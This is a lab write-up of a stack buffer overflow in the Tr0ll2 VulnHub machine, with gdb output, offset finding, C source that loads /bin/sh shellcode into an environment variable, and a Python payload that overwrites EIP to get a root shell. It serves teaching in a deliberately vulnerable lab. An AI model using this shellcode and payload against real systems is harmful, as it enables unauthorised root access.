I found a really good buffer overflow (BOF) example on vulnhub platform, tr0ll2 VM [Download Link](https://www.vulnhub.com/entry/tr0ll-2,107/)
This is the first way of binary exploitation, we will store the shellcode in the environment variable "EGG" and we will overwrite EIP with it.

Let's start!

# 0x01 System/Binary Enumeration

```bash
noob@Tr0ll2:/exploit$ uname -m
i686
```
We're on a 32bit system (i686 or i386).

Now we will upload checksec, to check binary protections.

```bash
noob@Tr0ll2:/tmp$ wget -q https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec
noob@Tr0ll2:/tmp$ mv checksec checksec.sh
noob@Tr0ll2:/tmp$ chmod +x checksec.sh
noob@Tr0ll2:/tmp$ ./checksec.sh --file=/exploit/binary --format=json
{ "/exploit/binary": { "relro":"partial","canary":"no","nx":"no","pie":"no","rpath":"no","runpath":"no","symbols":"yes","fortify_source":"no","fortified":"0","fortify-able":"2" } }
```

Awesome. Now let's run the binary normal & then we'll try to crash it.

```bash
noob@Tr0ll2:/exploit$ ./binary 
Usage: ./binary input
noob@Tr0ll2:/exploit$ ./binary 1337
1337
```

Alright, let's crash it now by sending 600 bytes input.

```bash
noob@Tr0ll2:/exploit$ ./binary $(python -c 'print "A" * 600')
Segmentation fault
```

Perfect, let's load it on gdb now to find the vulnerable function.

```bash
noob@Tr0ll2:/exploit$ gdb -q binary
Reading symbols from /exploit/binary...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	and    esp,0xfffffff0
   0x0804844a <+6>:	sub    esp,0x110
   0x08048450 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048454 <+16>:	jne    0x8048478 <main+52>
   0x08048456 <+18>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048459 <+21>:	mov    edx,DWORD PTR [eax]
   0x0804845b <+23>:	mov    eax,0x8048580
   0x08048460 <+28>:	mov    DWORD PTR [esp+0x4],edx
   0x08048464 <+32>:	mov    DWORD PTR [esp],eax
   0x08048467 <+35>:	call   0x8048340 <printf@plt>
   0x0804846c <+40>:	mov    DWORD PTR [esp],0x0
   0x08048473 <+47>:	call   0x8048370 <exit@plt>
   0x08048478 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804847b <+55>:	add    eax,0x4
   0x0804847e <+58>:	mov    eax,DWORD PTR [eax]
   0x08048480 <+60>:	mov    DWORD PTR [esp+0x4],eax
   0x08048484 <+64>:	lea    eax,[esp+0x10]
   0x08048488 <+68>:	mov    DWORD PTR [esp],eax
   0x0804848b <+71>:	call   0x8048350 <strcpy@plt> <-- Vulnerable Function
   0x08048490 <+76>:	mov    eax,0x8048591
   0x08048495 <+81>:	lea    edx,[esp+0x10]
   0x08048499 <+85>:	mov    DWORD PTR [esp+0x4],edx
   0x0804849d <+89>:	mov    DWORD PTR [esp],eax
   0x080484a0 <+92>:	call   0x8048340 <printf@plt>
   0x080484a5 <+97>:	leave  
   0x080484a6 <+98>:	ret    
End of assembler dump.
(gdb) 
```

Vulnerable C functions -> `gets, scanf, sprintf, strcpy`

So our vulnerable function is strcpy. 

Let's move on now to find the offset, the number of characters that overwrite EIP.

First we will generate a pattern with metasploit :

```bash
[root@pwn4magic]:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 600
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
```

Cool, let's use this with gdb as input.

```bash
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
Starting program: /exploit/binary Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
(gdb) 
```

Perfect gave us this address `0x6a413969` let's use pattern_offset now.

```bash
[root@pwn4magic]:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969
[*] Exact match at offset 268
```

# 0x02 Exploitation

First of all we need shellcode, i found a good one /bin/sh 23 bytes. [Link](http://shell-storm.org/shellcode/files/shellcode-827.php)

Now we will use 2 scripts, one script will store the shellcode and the other one will give us the address.

`eggcode.c`
```C
#include <unistd.h>
#define NOP 0x90

char shellcode[] =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
  char shell[512];
  puts("Eggshell loaded into environment.\n");
  memset(shell,NOP,512);     /* fill-up the buffer with NOP */
/* fill-up the shellcode on the second half to the end of buffer */
  memcpy(&shell[512-strlen(shellcode)],shellcode,strlen(shellcode));
  /* set the environment variable to */
  /* EGG and shell as its value, rewrite if needed */
  setenv("EGG", shell, 1);
  /* modify the variable */
  putenv(shell);
  /* invoke the bash */
  system("bash");
  return 0;
}
```

`findeggaddr.c`

```C
#include <unistd.h>

int main(void)
{
  printf("EGG address: 0x%lx\n", getenv("EGG"));
  return 0;
}
```

Let's upload them and compile them.

```bash
noob@Tr0ll2:/tmp$ gcc eggcode.c -o eggcode
noob@Tr0ll2:/tmp$ gcc findeggaddr.c -o findeggaddr
```

Cool, now we will run the eggcode first then the findeggaddr.

```bash
noob@Tr0ll2:/tmp$ ./eggcode 
Eggshell loaded into environment.

noob@Tr0ll2:/tmp$ ./findeggaddr 
EGG address: 0xbffffd01
```

Perfect, time to build our exploit! \O/

```python
from struct import pack
 
def p(x):
    return pack('<L', x)

payload = "A" * 268 #our offeset
payload += p(0xbffffd01) #little endian

print payload
```

Now let's fire it up!

```bash
noob@Tr0ll2:/exploit$ ./binary $(python /tmp/exploit.py)
# whoami
root
```

-pwn4magic
